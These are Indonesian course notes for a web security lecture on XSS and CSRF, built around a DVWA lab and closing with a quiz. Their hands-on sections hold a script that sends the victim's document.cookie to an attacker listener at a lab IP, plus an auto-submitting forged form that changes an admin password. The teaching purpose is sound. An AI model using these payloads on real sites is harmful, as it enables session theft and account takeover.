# Pertemuan 10 — Web Application Security: XSS & CSRF

Catatan ini aku susun dari materi dosen di `Network-Security-Course-Bank/Pertemuan10.md` (judul asli: "Pertemuan 10: Web Application Security - XSS & CSRF"). Hands-on-nya lanjut pakai lab DVWA yang sama kayak Pertemuan 9.

## Apa itu Cross-Site Scripting (XSS)?

**XSS** adalah kerentanan di mana penyerang memasukkan script jahat (biasanya JavaScript) ke dalam halaman web yang dilihat pengguna lain. Script-nya dijalankan di browser korban **dengan kredibilitas situs tersebut** — jadi browser nggak curiga, karena script datang dari domain yang dipercaya.

## Jenis-Jenis XSS

| Jenis | Penyimpanan | Contoh pemicu |
|---|---|---|
| **Stored (Persisten)** | Script tersimpan permanen di server | Kolom komentar, kolom profil user |
| **Reflected (Non-Persisten)** | Script "dipantulkan" dari request HTTP | Parameter pencarian di URL |
| **DOM-based** | Nggak lewat server — terjadi di client-side code JavaScript | JS memproses input user secara nggak aman |

> [!NOTE]
> Bedanya: Stored = **tersimpan dulu**, siapa pun yang buka halaman kena. Reflected = **harus dikirim link korban**, baru muncul di response. DOM-based = murni urusan script di browser, server bahkan nggak pernah menerima payload.

## Hands-On 1: Stored XSS untuk Pencurian Cookie

### Setup target
1. Buka DVWA, login, set security ke **Low**.
2. Pilih menu **XSS (Stored)**.

### Payload dasar
Masukkan script ini di kolom komentar:

```html
<script>alert('Terinfeksi XSS!')</script>
```

### Pencurian cookie
Tujuannya mengirim `document.cookie` milik korban ke server penyerang.

1. **Di Kali (attacker):** jalankan listener sederhana:

```bash
python3 -m http.server 8000
```

2. **Kirim payload XSS** di DVWA:

```html
<script>document.location='http://172.20.0.5:8000/steal?cookie=' + document.cookie;</script>
```

3. **Lihat log** — di terminal Kali akan muncul request berisi session ID korban.

> [!IMPORTANT]
> Yang dicuri itu **session ID**, bukan password. Dengan session ID, penyerang tinggal menempelkannya ke browser dia dan langsung jadi korban tanpa perlu login.

## Apa itu Cross-Site Request Forgery (CSRF)?

**CSRF** memaksa pengguna yang **sudah terautentikasi** melakukan tindakan yang tidak diinginkan pada aplikasi tempat dia sedang login.

> [!TIP]
> Beda fokus dengan XSS: CSRF **menargetkan tindakan yang mengubah status** (ganti password, transfer, hapus data), bukan pencurian data.

## Hands-On 2: CSRF dengan Auto-Submit Form

**Skenario:** memaksa admin mengubah password mereka tanpa mereka sadari.

**Analisis request:** di DVWA menu CSRF, perhatikan URL saat mengubah password — semua parameter (password baru, konfirmasi, tombol Change) ada di query string GET.

**Buat exploit page** di mesin penyerang:

```html
<!-- csrf_attack.html -->
<html>
  <body onload="document.forms[0].submit()">
    <h1>Selamat! Anda memenangkan Hadiah!</h1>
    <form action="http://172.20.0.10/vulnerabilities/csrf/" method="GET">
      <input type="hidden" name="password_new" value="..." />
      <input type="hidden" name="password_conf" value="..." />
      <input type="hidden" name="Change" value="Change" />
    </form>
  </body>
</html>
```

**Eksekusi:** kalau admin membuka link `csrf_attack.html` saat sedang login di DVWA, password-nya otomatis berubah. Form-nya auto-submit via `onload` — korban cukup membuka halaman, nggak perlu klik apa pun.

## Deteksi dan Pencegahan

### Pencegahan XSS

| Metode | Cara kerja |
|---|---|
| **Output encoding** | Ubah karakter khusus (`<`, `>`, `&`) jadi HTML entities (`&lt;`, `&gt;`) |
| **Content Security Policy (CSP)** | Membatasi dari mana script boleh dimuat |
| **HttpOnly cookie** | Mencegah JavaScript mengakses cookie |

### Pencegahan CSRF

| Metode | Cara kerja |
|---|---|
| **Anti-CSRF token** | Token unik & acak yang wajib disertakan di tiap request sensitif |
| **SameSite cookie attribute** | Membatasi pengiriman cookie pada cross-site request |
| **Verifikasi Referer/Origin header** | Memastikan request berasal dari domain yang sama |

> [!WARN]
> HttpOnly hanya melindungi **cookie** dari JS — dia nggak menyelesaikan XSS secara keseluruhan. Script tetap bisa jalan di halaman; yang gagal dicuri cuma cookie-nya.

## Latihan Mandiri (dari materi)

- **Reflected XSS:** coba menu XSS (Reflected), buat URL yang kalau diklik orang lain memunculkan alert berisi nama mereka sendiri.
- **CSP Bypass:** baca artikel tentang membypass CSP lemah via teknik **JSONP callback**.

```quiz
Q: Cross-Site Scripting (XSS) bekerja dengan cara...
+ Menyisipkan script jahat yang dijalankan di browser korban dengan kredibilitas situs
- Membobol firewall server agar port terbuka
- Memperlambat koneksi internet korban
> Script jalan di browser korban, sehingga browser menganggapnya sah karena datang dari situs yang dipercaya.

Q: Script XSS yang tersimpan permanen di kolom komentar disebut XSS...
+ Stored (persisten)
- Reflected (non-persisten)
- DOM-based
> Persisten = tersimpan di server, semua pengunjung halaman yang membuka komentar ikut terpapar.

Q: Reflected XSS berbeda dari stored karena...
+ Script dipantulkan langsung dari request HTTP dan tidak tersimpan di server
- Reflected selalu berupa cookie stealing
- Reflected hanya menyerang browser mobile
> Reflected butuh korban mengklik link yang membawa payload, lalu payload langsung muncul di response.

Q: Pada CSRF, target serangannya adalah...
+ Tindakan yang mengubah status oleh pengguna yang sudah login
- Pencurian database server
- Brute force password login
> CSRF tidak mencuri data; ia memanfaatkan sesi aktif korban untuk menjalankan aksi di akunnya.

Q: Kenapa CSRF tetap berhasil meskipun tidak ada XSS?
+ Browser otomatis menyertakan cookie sesi korban saat request dikirim dari halaman penyerang
- Karena CSRF memakai teknik SQL injection
- Karena korban memasukkan password sendiri
> Cookie sesi dikirim otomatis oleh browser, dan server tidak bisa membedakan request dari situs korban atau penyerang tanpa token/verifikasi origin.

Q: Mencegah JavaScript membaca cookie sesi dilakukan dengan menambahkan atribut...
+ HttpOnly
- SameSite
- Secure
> HttpOnly membuat cookie tidak bisa diakses lewat document.cookie; mati pintu pencurian cookie via XSS.

Q: Token unik acak yang wajib disertakan pada setiap request sensitif untuk menangkal CSRF disebut...
+ Anti-CSRF token
- CAPTCHA
- API key
> Penyerang tidak bisa menebak isi token sehingga tidak bisa memalsukan request yang valid.

Q: Output encoding mencegah XSS karena...
+ Karakter khusus seperti < dan > diubah menjadi HTML entities sehingga tidak diinterpretasi sebagai tag
- Server mematikan JavaScript secara global
- Semua input langsung dihapus
> Dengan encoding, payload tampil sebagai teks biasa, bukan kode yang dieksekusi.

Q: SameSite cookie attribute berguna untuk mencegah...
+ Pengiriman cookie pada request lintas situs (cross-site)
- Cookie dicuri lewat jaringan WiFi publik
- Cookie kedaluwarsa terlalu cepat
> SameSite membatasi kapan cookie ikut dikirim, sehingga request CSRF tidak membawa sesi korban.

Q: Payload XSS pada materi yang mengirim cookie korban ke listener Kali memakai...
+ document.location dengan concatenation document.cookie
- window.prompt
- fetch ke port 8080 dengan POST
> Alur materi: document.location='http://IP_ATTACKER:8000/steal?cookie=' + document.cookie, lalu request-nya terlihat di log listener.
```